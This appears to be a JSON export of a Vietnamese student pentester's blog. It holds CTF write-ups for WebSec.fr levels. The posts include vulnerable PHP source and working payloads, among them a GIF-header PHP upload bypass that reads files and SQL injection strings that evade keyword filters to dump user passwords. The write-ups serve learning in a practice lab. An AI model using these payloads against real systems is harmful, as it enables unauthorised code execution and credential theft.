{"meta":{"title":"Khado","subtitle":"Khado's Blog","description":"Nice to meet you üíñ","author":"Khado","url":"https://dovankha.github.io","root":"/"},"pages":[{"title":"About","date":"2022-07-19T02:30:21.000Z","updated":"2022-08-19T23:39:13.245Z","comments":true,"path":"about/index.html","permalink":"https://dovankha.github.io/about/index.html","excerpt":"","text":"Hi guys, I‚Äôm a student and a pentester Email : &#107;&#104;&#97;&#x64;&#111;&#x2e;&#x68;&#99;&#x6d;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109; Linkedin : https://www.linkedin.com/in/khadv Zalo : https://zalo.me/0336221622"}],"posts":[{"title":"[SVATTT] Warm Up Web02","slug":"WarmUpCTF-web2","date":"2022-09-25T01:36:20.000Z","updated":"2022-09-25T01:38:34.698Z","comments":true,"path":"2022/09/25/WarmUpCTF-web2/","link":"","permalink":"https://dovankha.github.io/2022/09/25/WarmUpCTF-web2/","excerpt":"","text":"","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"PathTraversal","slug":"PathTraversal","permalink":"https://dovankha.github.io/tags/PathTraversal/"}]},{"title":"[WebSec] Level 10","slug":"lv10","date":"2022-08-17T01:52:34.000Z","updated":"2022-08-20T09:18:36.659Z","comments":true,"path":"2022/08/17/lv10/","link":"","permalink":"https://dovankha.github.io/2022/08/17/lv10/","excerpt":"","text":"https://websec.fr/level10/index.php Information GatheringChallenge n√†y thu·ªôc v·ªÅ d·∫°ng l·ªói Type Jugling. C√°c b·∫°n c√≥ th·ªÉ tham kh·∫£o challenge t∆∞∆°ng t·ª± v√† c√°c gi·∫£i th√≠ch t·∫°i ƒë√¢y. ƒê·ªÉ n√≥i m·ªôt c√°ch ng·∫Øn g·ªçn th√¨ l·ªói n√†y x·∫£y ra do trong source code s·ª≠ d·ª•ng == ƒë·ªÉ so s√°nh thay v√¨ ===. Ng∆∞·ªùi ta g·ªçi == l√† loose compare v√† === l√† strict compare. Kh√°c nhau ·ªü 2 c√°ch so s√°nh n√†y l√† == th√¨ n√≥ s·∫Ω convert v·ªÅ c√πng ki·ªÉu gi√° tr·ªã ƒë·ªÉ so s√°nh. V√≠ d·ª•: ‚Äú1‚Äù &#x3D;&#x3D; 1 ‚Äì&gt; True ‚Äú123a‚Äù &#x3D;&#x3D; ‚Äú123‚Äù ‚Äì&gt; True md5(0e91238) &#x3D;&#x3D; md5(0) ‚Äì&gt; True C√≤n so s√°nh === th√¨ ph·∫£i ƒë√∫ng 100% ki·ªÉu d·ªØ li·ªáu th√¨ m·ªõi cho k·∫øt qu·∫£ True: V√≠ d·ª•: ‚Äú1‚Äù &#x3D;&#x3D;&#x3D; ‚Äú1‚Äù ‚Äì&gt; True 1 &#x3D;&#x3D;&#x3D;1 ‚Äî&gt; True False &#x3D;&#x3D;&#x3D; False ‚Äì&gt; True Source code ƒêo·∫°n code tr√™n ki·ªÉm tra n·∫øu t·ªìn t·∫°i 2 parameters l√† f v√† hash th√¨ s·∫Ω th·ª±c thi code b√™n trong. Nh∆∞ng c√≥ 2 v·∫•n ƒë·ªÅ c·∫ßn ch√∫ √Ω l√† d√≤ng 7 v√† d√≤ng 10. D√≤ng 7: filename c·ªßa parameter f s·∫Ω ƒë∆∞·ª£c n·∫±m gi·ªØa 2 bi·∫øn $flag. Sau ƒë√≥ s·∫Ω encrypt md5 chu·ªói ƒë√≥ v√† s·∫Ω c·∫Øt l·∫•y 8 k√Ω t·ª± ƒë·∫ßu ti√™n. D√≤ng 10: So s√°nh $hash c·ªßa d√≤ng 7 v√† c√°i hash c·ªßa m√¨nh nh·∫≠p v√†o. M·ª•c ti√™u c·ªßa m√¨nh s·∫Ω ƒë·ªçc file flag.php v√† c√°i hash c·ªßa m√¨nh ph·∫£i so s√°nh == v·ªõi $hash. Exploitƒê·ªÉ khai th√°c b√†i n√†y s·∫Ω c√≥ 2 c√°ch, ƒë·ªÅu l√† brute force c·∫£. C√°ch 1Brute force gi√° tr·ªã hash (c√°ch n√†y kh√¥ng kh·∫£ thi v√¨ abcdefghijklmnopqrstuvwxyz0123456789 l√† 36 k√Ω t·ª±, ch·ªçn ng·∫´u nhi√™n 8 k√Ω t·ª± c·ªßa 36 k√Ω t·ª± l√† 30260340 tr∆∞·ªùng h·ª£p c·∫ßn th·ª≠). C√°ch 2Brute force filename. ·ª¶a alo??? Filename l√† flag.php m√† ƒëi brute force chi cha n·ªôi &#x3D;)) N√†iii, filename flag.php c≈©ng ch√≠nh l√† ./flag.php m√† c≈©ng ch√≠nh l√† .//flag.php hay l√† ./////flag.php. Khi ƒë√≥, s·ªë l∆∞·ª£ng / (forward slash) ƒë·ªß l·ªõn th√¨ s·∫Ω ƒëem l·∫°i gi√° tr·ªã md5 hash d∆∞·ªõi d·∫°ng &lt;number&gt;e&lt;alphabet numerals&gt; V√≠ d·ª• m√¨nh c√≥ 1 file test.php. Run file test.php v√† .//////////test.php v·∫´n ra k·∫øt qu·∫£ nh∆∞ nhau. B·∫Øt intercept g·ª≠i v√†o intruder Burp Suite. Ch·ªçn payload l√† character blocks v·ªõi base string l√† /. K·∫øt qu·∫£ l√† 881 / V√† flag l√†: Sau khi c√≥ flag, m√¨nh th·ª≠ l·∫°i c√°ch so s√°nh c·ªßa code th·ª≠ c√≥ ƒë√∫ng kh√¥ng? 123456&lt;?php$flag = &quot;WEBSEC&#123;Lose_typ1ng_system_are_super_great_aren&#x27;t_them?&#125;&quot;;$hash = md5($flag . &#xflag.php&#x27; . $flag);$hash_substr = substr(md5($flag . &#xflag.php&#x27; . $flag), 0, 8);var_dump($hash_substr == &quot;0e1337&quot;);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"easy","slug":"easy","permalink":"https://dovankha.github.io/tags/easy/"},{"name":"TypeJugling","slug":"TypeJugling","permalink":"https://dovankha.github.io/tags/TypeJugling/"}]},{"title":"[WebSec] Level 8","slug":"lv8","date":"2022-08-07T04:19:52.000Z","updated":"2022-08-16T14:59:16.118Z","comments":true,"path":"2022/08/07/lv8/","link":"","permalink":"https://dovankha.github.io/2022/08/07/lv8/","excerpt":"","text":"https://websec.fr/level08/index.php Information GatheringChallenge n√†y li√™n quan ƒë·∫øn ki·∫øn th·ª©c Upload File v√† GIF. GIF l√† g√¨? GIF vi·∫øt t·∫Øt c·ªßa t·ª´ Graphics Interchange Format. N√¥m na ti·∫øng Vi·ªát g·ªçi l√† ·∫£nh ƒë·ªông. C√≥ ƒëu√¥i file l√† .gif v√† ph·∫ßn signature c·ªßa file l√† GIF89a. Trong ƒë√≥: GIF8 l√† m√£ signature, c√≤n 9a l√† version c·ªßa file GIF ƒë√≥. C√°c b·∫°n c√≥ th·ªÉ tham kh·∫£o th√™m GIF Signature Format t·∫°i ƒë√¢y. Source code123456789101112131415161718&lt;?php $uploadedFile = sprintf(&#x27;%1$s/%2$s&#x27;, &#x27;/uploads&#x27;, sha1($_FILES[&#x27;fileToUpload&#x27;][&#x27;name&#x27;]) . &#x27;.gif&#x27;); if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125; if ($_FILES[&#x27;fileToUpload&#x27;][&#x27;size&#x27;] &lt;= 50000) &#123; if (getimagesize ($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;]) !== false) &#123; if (exif_imagetype($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;]) === IMAGETYPE_GIF) &#123; move_uploaded_file ($_FILES[&#x27;fileToUpload&#x27;][&#x27;tmp_name&#x27;], $uploadedFile); echo &#x27;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#x27; . $uploadedFile . &#x27;&quot;&gt;&#x27;. htmlentities($_FILES[&#x27;fileToUpload&#x27;][&#x27;name&#x27;]) . &#x27;&lt;/a&gt;:&lt;/p&gt;&#x27;; echo &#x27;&lt;pre&gt;&#x27;; include_once($uploadedFile); echo &#x27;&lt;/pre&gt;&#x27;; unlink($uploadedFile); &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#x27;; &#125;?&gt; ƒê·ªçc source code ph√≠a tr√™n, ta th·∫•y c√≥ 3 ƒëi·ªÅu ki·ªán ƒë·ªÉ upload file th√†nh c√¥ng. Size file ƒë·ªÉ upload kh√¥ng ƒë∆∞·ª£c qu√° 50kb (50000 bytes). File ƒë√≥ ph·∫£i l√† file GIF. File ƒë√≥ kh√¥ng ƒë∆∞·ª£c r·ªóng. M√¨nh ƒë√£ th·ª≠ upload c√°c file th√¥ng th∆∞·ªùng nh∆∞ng ch∆∞a v∆∞·ª£t qua 3 ƒëi·ªÅu ki·ªán tr√™n ƒë√≥ (c√≥ l·∫Ω v√¨ file GIF download t·ª´ Google v·ªÅ qu√° n·∫∑ng). ExploitTr∆∞·ªõc khi ƒë·ªÉ·ªÉ khai th√°c ƒë∆∞·ª£c b√†i n√†y th√¨ m√¨nh ph·∫£i x√°c ƒë·ªãnh l√† s·∫Ω upload 1 file c√≥ ch·ª©a c√°c d√≤ng code PHP b√™n trong file ƒë√≥ (t·∫°m g·ªçi l√† shell PHP). ƒê·ªÉ √Ω h√†m getimagesize() n√≥ s·∫Ω tr·∫£ v·ªÅ gi√° tr·ªã kh√°c false th√¨ m·ªõi ƒë∆∞·ª£c. C√πng debug h√†m getimagesize() n√†y ƒë·ªÉ xem c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ ra sao? M√¨nh s·∫Ω chu·∫©n b·ªã 2 file trong c√πng m·ªôt th∆∞ m·ª•c c√≥ t√™n l√† 1.php v√† getimagesize.php v·ªõi n·ªôi dung sau. 12# 1.php&lt;?php phpinfo(); ?&gt; 12345# getimagesize.php&lt;?php$file = &quot;1.php&quot;;$info = getimagesize($file);echo print_r($info,true); Sau khi run file getimagesize.php th√¨ k·∫øt qu·∫£ s·∫Ω kh√¥ng ra g√¨ c·∫£. Nh∆∞ng n·∫øu m√¨nh th√™m ph·∫ßn Signature c·ªßa GIF v√†o file 1.php th√¨ sao? M√¨nh c√≥ th·ªÉ th√™m tr·ª±c ti·∫øp Signature v√†o file. Ho·∫∑c d√πng tool online 12# 1.phpGIF89a &lt;?php phpinfo(); ?&gt; Run l·∫°i file getimagesize.php, th√¨ ƒë√£ ra ƒë∆∞·ª£c k·∫øt qu·∫£. M·∫∑c d√π l√† file php nh∆∞ng mime-type l√† image/gif. M√¨nh c√≥ th·ªÉ bypass qua v√≤ng if th·ª© 2. Ti·∫øp theo m√¨nh upload file l√™n xem server c√≥ x·ª≠ l√≠ kh√¥ng? V·∫≠y l√† server c√≥ x·ª≠ l√≠ code trong file 1.php. Vi·ªác ti·∫øp theo m√¨nh xem trong th∆∞ m·ª•c hi·ªán t·∫°i c√≥ nh·ªØng file n√†o? M√¨nh ƒë√£ th·ª≠ c√°c webshell PHP, tuy nhi√™n ƒë√£ b·ªã filter hay ch·∫∑n g√¨ ƒë√≥ n√™n kh√¥ng d√πng ƒë∆∞·ª£c. Thay v√¨ s·ª≠a code l·∫°i trong file 1.php th√¨ m√¨nh d√πng Burp Suite ƒë·ªÉ s·ª≠a code lu√¥n cho nhanh. 1GIF89a &lt;?php print_r(scandir(&#x27;/&#x27;)); ?&gt; ƒê·ªçc file flag.txt l√† xong. 12GIF89a &lt;?php print_r(scandir(&#x27;/&#x27;)); echo file_get_contents(&#x27;flag.txt&#x27;);?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"easy","slug":"easy","permalink":"https://dovankha.github.io/tags/easy/"},{"name":"uploadFile","slug":"uploadFile","permalink":"https://dovankha.github.io/tags/uploadFile/"}]},{"title":"[WebSec] Level 2","slug":"lv2","date":"2022-08-05T08:01:02.000Z","updated":"2022-08-16T14:58:37.700Z","comments":true,"path":"2022/08/05/lv2/","link":"","permalink":"https://dovankha.github.io/2022/08/05/lv2/","excerpt":"","text":"https://websec.fr/level02/index.php Information Gathering Challenge n√†y c≈©ng gi·ªëng t∆∞∆°ng t·ª± nh∆∞ Level 1. Tuy nhi√™n, c√≥ th√™m 1 h√†m preg_replace() ƒë·ªÉ filter c√°c t·ª´ nh∆∞ union, order, select, from, group, by. Source code123456789101112131415161718192021222324252627&lt;?phpini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);class LevelTwo &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#x27;leveltwo.db&#x27;, SQLITE3_OPEN_READONLY); $searchWords = implode ([&#x27;union&#x27;, &#x27;order&#x27;, &#x27;select&#x27;, &#x27;from&#x27;, &#x27;group&#x27;, &#x27;by&#x27;], &#x27;|&#x27;); $injection = preg_replace (&#x27;/&#x27; . $searchWords . &#x27;/i&#x27;, &#x27;&#x27;, $injection); $query = &#x27;SELECT id,username FROM users WHERE id=&#x27; . $injection . &#x27; LIMIT 1&#x27;; $getUsers = $pdo-&gt;query ($query); $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125;&#125;if (isset ($_POST[&#x27;submit&#x27;]) &amp;&amp; isset ($_POST[&#x27;user_id&#x27;])) &#123; $lt = new LevelTwo (); $userDetails = $lt-&gt;doQuery ($_POST[&#x27;user_id&#x27;]);&#125;?&gt; Quan s√°t th·∫•y d√≤ng 11, s·ª≠ d·ª•ng query n·ªëi chu·ªói b·ªüi bi·∫øn $injection. T·ª´ ch·ªó n√†y, m√¨nh c√≥ th·ªÉ ng·∫Øt query v√† ch√®n payloads c·ªßa m√¨nh v√†o ƒë·ªÉ khai th√°c. Ho·∫∑c m√¨nh nh·∫≠p v√†o d·∫•u &#39; th√¨ trang web s·∫Ω b√°o l·ªói nh∆∞ h√¨nh d∆∞·ªõi, t·ª´ ƒë√≥ m√¨nh x√°c ƒë·ªãnh ƒë∆∞·ª£c l·ªói SQLi. Exploitƒê·∫ßu ti√™n ph·∫£i x√°c ƒë·ªãnh ƒë∆∞·ª£c query select m·∫•y c·ªôt. Nh√¨n v√†o query d√≤ng 11 m√¨nh x√°c ƒë·ªãnh 2 c·ªôt ƒë∆∞·ª£c select l√† id v√† username. M√¨nh c√≥ th·ªÉ x√°c ƒë·ªãnh c·∫•u tr√∫c sql ƒë∆∞·ª£c d√πng b·∫±ng c√°ch. 1select sql from sqlite_master; Tuy nhi√™n, n·∫øu d√πng c√°c t·ª´ kho√° nh∆∞ select, from, ‚Ä¶ th√¨ s·∫Ω b·ªã replace th√†nh k√≠ t·ª± tr·ªëng (l√† b·ªã xo√° m·∫•t lu√¥n). 12$searchWords = implode ([&#x27;union&#x27;, &#x27;order&#x27;, &#x27;select&#x27;, &#x27;from&#x27;, &#x27;group&#x27;, &#x27;by&#x27;], &#x27;|&#x27;);$injection = preg_replace (&#x27;/&#x27; . $searchWords . &#x27;/i&#x27;, &#x27;&#x27;, $injection); ƒê·ªÉ bypass h√†m preg_replace() trong tr∆∞·ªùng h·ª£p tr√™n th√¨ m√¨nh d√πng ph∆∞∆°ng ph√°p REPLACED KEYWORDS. V√≠ d·ª•: seSELECTlect sau khi qua preg_replace() l√† select. T∆∞∆°ng t·ª± v·ªõi c√°c t·ª´ kho√° c·∫ßn d√πng m√† b·ªã replace th√¨ c·ª© √°p d·ª•ng v√†o. Check sql struct 11 and 1=2 unUNIONion seSELECTlect sql,2 frFROMom sqlite_master-- B∆∞·ªõc cu·ªëi c√πng ch·ªâ c·∫ßn l·∫•y flag l√† xong. 11 and 1=2 unUNIONion seSELECTlect username,password frFROMom users--","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"easy","slug":"easy","permalink":"https://dovankha.github.io/tags/easy/"},{"name":"sqli","slug":"sqli","permalink":"https://dovankha.github.io/tags/sqli/"}]},{"title":"[WebSec] Level 28","slug":"lv28","date":"2022-08-04T03:31:03.000Z","updated":"2022-08-17T03:29:30.445Z","comments":true,"path":"2022/08/04/lv28/","link":"","permalink":"https://dovankha.github.io/2022/08/04/lv28/","excerpt":"","text":"https://websec.fr/level28/index.php Information GatheringTh√¥i, b√†i n√†y m√¨nh kh√¥ng test ki·ªÉu BlackBox n·ªØa‚Ä¶ V√¨ test c√≥ ra l·ªói ƒë√¢u &#x3D;)) V√†o ƒë·ªçc source code th√¥i. C√°c challenge CTF th∆∞·ªùng th√¨ h·ªç ƒë·ªÅu cho m√¨nh source ƒë·ªÉ ƒë·ªçc. C√°c b·∫°n c√≥ th·ªÉ theo d√µi ƒëo·∫°n code b√™n d∆∞·ªõi. Source code1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123; if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123; die(&#x27;Your file is too heavy.&#x27;); &#125; $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;; $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;); $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;])); @fclose($fp); file_put_contents($filename, $flagfilecontent); if (md5_file($filename) === md5_file(&#x27;flag.php&#x27;) &amp;&amp; $_POST[&#x27;checksum&#x27;] == crc32($_POST[&#x27;checksum&#x27;])) &#123; include($filename); // it contains the `$flag` variable &#125; else &#123; $flag = &quot;Nope, $filename is not the right file, sorry.&quot;; sleep(1); // Deter bruteforce &#125; unlink($filename);&#125;?&gt;------------------------------------------------------------------------------------------&lt;?php if (isset($flag))&#123; echo $flag; &#125; else &#123; echo &#x27;Can you guess it?&#x27;; &#125;?&gt; Ph√¢n t√≠ch v·ªÅ source code: T·ª´ d√≤ng 1 - 5: H√†m if() ki·ªÉm tra m√¨nh ƒë√£ submit hay kh√¥ng? N·∫øu c√≥ th√¨ file upload c·ªßa m√¨nh l√™n c√≥ n·∫∑ng qu√° 4096 kb hay kh√¥ng? N·∫øu n·∫∑ng qu√° 4096 kb th√¨ s·∫Ω b√°o l·ªói l√† Your file is too heavy. v√† die ch∆∞∆°ng tr√¨nh. D√≤ng 6: $file_name s·∫Ω ƒë∆∞·ª£c g√°n b·∫±ng gi√° tr·ªã nh∆∞ tr√™n source code, v·ªõi md5($_SERVER[&#39;REMOTE_ADDR&#39;]) s·∫Ω l√† gi√° tr·ªã IP m√¨nh ƒëang truy c·∫≠p ƒë∆∞·ª£c encrypt md5. ./tmp/ae018b12db79741c0b9026378e0be6d5.php D√≤ng 12: n·ªôi dung trong file ƒë∆∞·ª£c upload s·∫Ω ƒë∆∞·ª£c g√°n cho $file_name. D√≤ng 13: Trong h√†m if() ki·ªÉm tra md5($file_upload) ph·∫£i tr√πng v·ªõi n·ªôi dung trong file flag md5(flag.php). K·∫øt h·ª£p vi·ªác vi·ªác loose compare gi·ªØa checksum m√¨nh nh·∫≠p v√†o v√† crc32(&#39;checksum&#39;). ƒê·ªÉ bypass qua ƒë∆∞·ª£c loose compare c·ªßa checksum th√¨ m√¨nh s·∫Ω d√πng array() ƒë·ªÉ so s√°nh. ExploitUpload file flag.php v·ªõi n·ªôi dung nh∆∞ sau: 12#FILE flag.php&lt;?php show_source(&quot;flag.php&quot;); ?&gt; ƒê·ªÉ √Ω th·∫•y khi upload file l√™n, file s·∫Ω ƒë∆∞·ª£c g√°n b·∫±ng tmp_name ·ªü server. V√† ch·ªâ ƒë∆∞·ª£c t·ªìn t·∫°i sau 1 gi√¢y (d√≤ng 17 sleep(1)). N√™n kh√¥ng th·ªÉ n√†o truy c·∫≠p v√†o file m·ªõi g·ªçi ƒë∆∞·ª£c. ƒê·ªÉ c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c file flag.php v·ª´a upload l√™n, m√¨nh s·∫Ω cho ch·∫°y 150 reuqests trong intruder Burp Suite, v·ªõi th·ªùi gian gi·ªØa c√°c request l√† 900 mili gi√¢y. Sau khi Start, m√¨nh upload l·∫°i file flag.php v√† c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c file. Nh∆∞ng kh√¥ng hi·ªán ra flag :( Stuffing ‚Ä¶","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"uploadFile","slug":"uploadFile","permalink":"https://dovankha.github.io/tags/uploadFile/"}]},{"title":"[WebSec] Level 25","slug":"lv25","date":"2022-07-30T15:26:52.000Z","updated":"2022-08-16T15:00:05.895Z","comments":true,"path":"2022/07/30/lv25/","link":"","permalink":"https://dovankha.github.io/2022/07/30/lv25/","excerpt":"","text":"http://websec.fr/level25/index.php Information Gatheringƒê·∫ßu ti√™n v·∫´n th·ª≠ c√°c payloads v·ªÅ SQLi, v·ªÅ XSS, ‚Ä¶ Tuy nhi√™n v·∫´n kh√¥ng c√≥ l·ªói g√¨ xu·∫•t hi·ªán. View-source challenge th√¨ m√¨nh c·∫ßn ch√∫ √Ω ƒë·∫øn 2 ƒëo·∫°n code PHP trong ƒë√≥. Source code 1123456&lt;?phpif (!isset($_GET[&#x27;page&#x27;])) &#123; header(&#x27;Location: http://websec.fr/level25/index.php?page=main&#x27;); die();&#125;?&gt; V·ªõi ƒëo·∫°n code 1 tr√™n th√¨ check xem trong URL c·ªßa ch√∫ng c√≥ t·ªìn t·∫°i parameter page kh√¥ng. N·∫øu kh√¥ng c√≥, th√¨ s·∫Ω Redirect sang trang c√≥ page=main (trang ch·ªß c·ªßa challenge). Source code 2123456789&lt;?phpparse_str(parse_url($_SERVER[&#x27;REQUEST_URI&#x27;])[&#x27;query&#x27;], $query);foreach ($query as $k =&gt; $v) &#123; if (stripos($v, &#x27;flag&#x27;) !== false) die(&#x27;You are not allowed to get the flag, sorry :/&#x27;);&#125;include $_GET[&#x27;page&#x27;] . &#x27;.txt&#x27;;?&gt; V·ªõi ƒëo·∫°n code 2 ·ªü tr√™n, ch√∫ng ta c√≥ nhi·ªÅu v·∫•n ƒë·ªÅ ƒë·ªÉ ph√¢n t√≠ch h∆°n.D√≤ng code th·ª© 2, h√†m parse_url() c√≥ ch·ª©c nƒÉng ph√¢n t√≠ch c√°c th√†nh ph√¢n c·ªßa URL ra. Sau ƒë√≥ s·∫Ω g√°n v√†o bi·∫øn $query. H√†m parse_url() ho·∫°t ƒë·ªông nh∆∞ sau: 1234567891011121314151617- $url: &quot;http://example.com/thu-muc/file.php?cmd=ls#rce&quot;- Sau khi ƒë∆∞a bi·∫øn v√†o h√†m parse_url() th√¨ h·∫øt qu·∫£ ra s·∫Ω l√†:array(5) &#123; [&quot;scheme&quot;]=&gt; string(4) &quot;http&quot; [&quot;host&quot;]=&gt; string(11) &quot;example.com&quot; [&quot;path&quot;]=&gt; string(17) &quot;/thu-muc/file.php&quot; [&quot;query&quot;]=&gt; string(6) &quot;cmd=ls&quot; [&quot;fragment&quot;]=&gt; string(3) &quot;rce&quot;&#125;- Return c·ªßa h√†m parse_url() l√†: int|string|array|null|false Sau khi v√†o v√≤ng for, n·∫øu nh∆∞ gi√° tr·ªã trong $query l√∫c n√†y ch√≠nh k·∫øt qu·∫£ ƒë·∫ßu ra c·ªßa h√†m parse_url() m√† kh√°c false th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω die. V·∫≠y, l√†m sao ƒë·ªÉ ch∆∞∆°ng tr√¨nh kh√¥ng die? Exploitƒê·ªÉ ch∆∞∆°ng tr√¨nh in ra ƒë∆∞·ª£c flag, th√¨ ph·∫£i bypass qua v√≤ng for. Search Google: ‚Äúparse_url return false in php‚Äù https://stackoverflow.com/questions/47807529/how-to-avoid-php-parse-url-return-false-when-parse-sa-12b-12-3-3-41233-whi Sau khi tham kh·∫£o link tr√™n k·∫øt h·ª£p vi·ªác debug, th√¨ m√¨nh ph·∫£i cho c√°i c·∫•u tr√∫c c·ªßa c√°c param sau khi qua h√†m parse_url k·∫øt qu·∫£ b·ªã sai. V√≠ d·ª•: http://example.com///thu-muc/file.php?...-&gt; /// s·∫Ω l√†m cho parse_url() hi·ªÉu l√† host. N√™n s·∫Ω b·ªã sai. http://example.com/thu-muc/file.php?cmd=ls&amp;a=1.1.1.1:39-&gt; &amp;a c√≥ gi√° tr·ªã l√† host:port, c≈©ng s·∫Ω l√†m cho parse_url() hi·ªÉu sai. M·ª•c ƒë√≠ch c·ªßa m√¨nh l·∫•y flag ·ªü file flag.txt. V√¨ sau thi include page v√†o th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω t·ª± g·∫Øn ƒëu√¥i txt cho m√¨nh. Vi·ªác c√≤n l·∫°i ch·ªâ l·∫•y flag th√¥i.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://dovankha.github.io/categories/CTF/"},{"name":"Websec","slug":"CTF/Websec","permalink":"https://dovankha.github.io/categories/CTF/Websec/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dovankha.github.io/tags/ctf/"},{"name":"babysteps","slug":"babysteps","permalink":"https://dovankha.github.io/tags/babysteps/"},{"name":"parameter","slug":"parameter","permalink":"https://dovankha.github.io/tags/parameter/"}]},{"title":"[WebSec] Level 17","slug":"lv17","date":"2022-07-24T14:05:06.000Z","updated":"2022-08-16T14:59:21.784Z","comments":true,"path":"2022/07/24/lv17/","link":"","permalink":"https://dovankha.github.io/2022/07/24/lv17/","excerpt":"","text":"https://websec.fr/level17/index.php Information GatheringNh∆∞ th∆∞·ªùng l·ªá, b∆∞·ªõc ƒë·∫ßu ti√™n ch√∫ng ta ng√≥ xem qua ph·∫ßn giao di·ªán, c√≥ ch·ªó input v√† button Submit. N√≥ y√™u c·∫ßu m√¨nh ƒëo√°n flag, n√™n th·ª≠ nh·∫≠p ƒë·∫°i g√¨ ƒë√≥, v√† xem response tr·∫£ v·ªÅ th·∫ø n√†o. Kh√¥ng c√≥ g√¨ ƒë√°ng ch√∫ √Ω h∆°n link t·ªõi source code. Challenge cho s·∫µn lu√¥n source code, ch√∫ng qua v√† ƒë·ªÉ √Ω ƒë·∫øn 2 ph·∫ßn code PHP. 123456789101112&lt;?phpinclude &quot;flag.php&quot;;function sleep_rand() &#123; /* I wish php5 had random_int() */ $range = 100000; $bytes = (int) (log($range, 2) / 8) + 1; do &#123; /* Side effect: more random cpu cycles wasted ;) */ $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); &#125; while ($rnd &gt;= $range); usleep($rnd);&#125;?&gt; ƒêo·∫°n code tr√™n ch·ªâ l√† h√†m ƒë·ªÉ delay trong qu√° tr√¨nh th·ª±c thi ch∆∞∆°ng tr√¨nh. Khi n√†o g·ªçi l·∫°i h√†m sleep_rand() th√¨ ƒëo·∫°n x·ª≠ l√≠ ƒë√≥ s·∫Ω delay. Th·ªùi gian delay l√¢u hay mau ph·ª• thu·ªôc v√†o h√†m random ·ªü d√≤ng 8. H√†m openssl_random_pseudo_bytes() s·∫Ω t·∫°o ra random string pseudo_bytes t·ª´ param $bytes ·ªü d·∫°ng binary. Sau ƒë√≥ h√†m bin2hex() s·∫Ω convert binary sang d·∫°ng hex. Ti·∫øp theo h√†m hexdec() s·∫Ω convert hex sang d·∫°ng decemal. ƒê·∫°i kh√°i l√† h√†m tr√™n c≈©ng kh√¥ng ·∫£nh h∆∞∆°ng t·ªõi challenge nhi·ªÅu, v√¨ h√†m usleep() s·∫Ω delay ch∆∞∆°ng tr√¨nh v·ªõi param l√† micro second. V√≠ d·ª• usleep(2000000) th√¨ s·∫Ω delay 2s. Ti·∫øp ƒë·∫øn source code c√≤n l·∫°i: 123456&lt;?php if (! strcasecmp ($_POST[&#x27;flag&#x27;], $flag)) echo &#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27; . $flag . &#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;; else echo &#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;;?&gt; Quan s√°t th·∫•y th√¨ ƒëo·∫°n code ph√≠a tr√™n s·∫Ω so s√°nh gi√° tr·ªã c·ªßa flag khi input t·ª´ user v√†o v√† gi√° tr·ªã $flag ƒë√£ assign trong ch∆∞∆°ng tr√¨nh. Nh∆∞ng ƒë·ªÉ so s√°nh th√¨ d√πng h√†m strcasecmp(), ƒëi·ªÅu ƒë√°ng n√≥i h∆°n ·ªü ƒë√¢y l√† d·∫•u ch·∫•m thang ·ªü ph√≠a tr∆∞·ªõc h√†m. H√†m 